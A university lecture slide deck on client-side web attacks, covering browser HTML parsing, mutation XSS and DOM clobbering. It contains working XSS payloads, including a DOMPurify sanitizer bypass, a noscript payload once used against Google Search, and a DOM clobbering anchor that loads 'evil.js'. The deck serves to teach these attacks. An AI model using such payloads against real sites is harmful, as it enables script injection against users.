---
title: "x8: cs"
layout: "bundle"
outputs: ["Reveal"]
---

## We'll get started at 18:05

---

{{< slide class="center" >}}
## client side attacks
### 6843 week8 

---

* how do browsers work?
* how can we exploit this
    * mutation xss
    * dom clobbering
* client-side js exploitation

---

{{% section %}}

### how do browsers work
they render html, css, and js into the DOM

> you can think of them kinda like an intepreter (or a couple of interpreters)

---

### syntax errors
what happens when a brower receives invalidly formatted content (js, html, css)?

> have you even seen a html syntax error

---

### javascript
it throws an error (v8/spidermonkey)

```html
<script>this isn't valid code</script>
```

![](/assets/img/lectures/syntax-error.png)

---

### html
it gives an error, but still renders the page

```html
<div>My First Website</div>
<!-- Start tag seen without seeing a doctype first. Expected "<!DOCTYPE html>" -->
<p>bottom text</p>
```

---

### even worse code
what happens here
```html
<div><script id="</div>">
```

&nbsp;

is it different to this?
```html
<script><div id="</script>">
```

---

### an aside
different browsers are different

* these mutations are browser specific
* chrome, firefox, brave, idk that gamer one will all parse and handle html differently
* it can be dangerous to assume all browsers treat content the same

---

### how to handle sanitization
is it better to do it client or server-side

* you might assume server-side (just encode)
* sometimes you need rich text (e.g. emails, blogs)
* on the client side, you can harness the power of the browsers built-in parser for the sanitization

{{% /section %}}

---

{{% section %}}

### mutation xss (mXSS)
mutation xss abuses these browser "mutations" to bypass filters and sanitizers

* you submit with a seemingly benign payload
* the sanitizer/filter will recognise it as "benign"
* when the browser parses it, it gets mutated into something malicious

---

### how do browsers handle sanitization?

[dom purify](https://github.com/cure53/DOMPurify/blob/main/src/purify.js#L129)

---

### a simple example
```javascript
const div = document.createElement('div');
document.children[0].appendChild(div);
const template = document.createElement('template');
template.innerHTML = '<img src=x onerror=alert(1)/>'
template.content.children[0] // contains 'my bad content'
// sanitize the bad attribute
template.content.children[0].removeAttribute('onerror');
// safely add the content to the page
div.innerHTML = template.content.children[0];
```

---

### demo

---

### solution
from [here](https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss)

```html
<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">
```

---

### how does this work

```js
DOMPurify.sanitize('<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">')
```

```html
<math>
    <mtext>
        <mglyph>
            <style>
            <!--</style><img title="-->
        </mglyph>
            <img src=1 onerror=alert(1)>">
        </mglyph>
        <table>
        </table>
    </mtext>
</math>
```

---

### another example
mxss in google search (2019)

```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

---

### what is noscript
The \<noscript\> tag defines an alternate content to be displayed to users that have disabled scripts in their browser or have a browser that doesn't support script.

---

### what is the difference
also what is noscript

```js
template.innerHTML = '<noscript>...'
template.content.children[0]
// <noscript>
//  <p title="</noscript><img src=x onerror=alert(1)>"></p>
// </noscript>

div.innerHTML = '<noscript>...'
div.children[0]
// <noscript><p title="</noscript>
// <img src="x" onerror="alert(1)">
// "">"
// <p></p>
```

---

### resources

* [mxss in google search](https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/)
* [mutation xss paper](https://cure53.de/fp170.pdf)
* [more dompurify bypass w/ mxss](https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss)

{{% /section %}}

---

{{% section %}}

### dom clobbering
a technique which exploits how javascript interacts with page content

* if 
* by injecting html, you can manipulate the DOM, and possibly invoke javascript execution
* can allow xss where html injection is possible, but normal xss payloads are blocked

---

### an example
```js
window.onload = function(){
    let someObject = window.someObject || {};
    let script = document.createElement('script');
    script.src = someObject.url;
    document.body.appendChild(script);
};
```

```html
<a id=someObject name=url href=abc/evil.js>
```

---

### resources

* [some example payloads](https://domclob.xyz/domc_markups/list)
* read more [here](https://portswigger.net/web-security/dom-based/dom-clobbering)


{{% /section %}}

---

{{% section %}}



{{% /section %}}
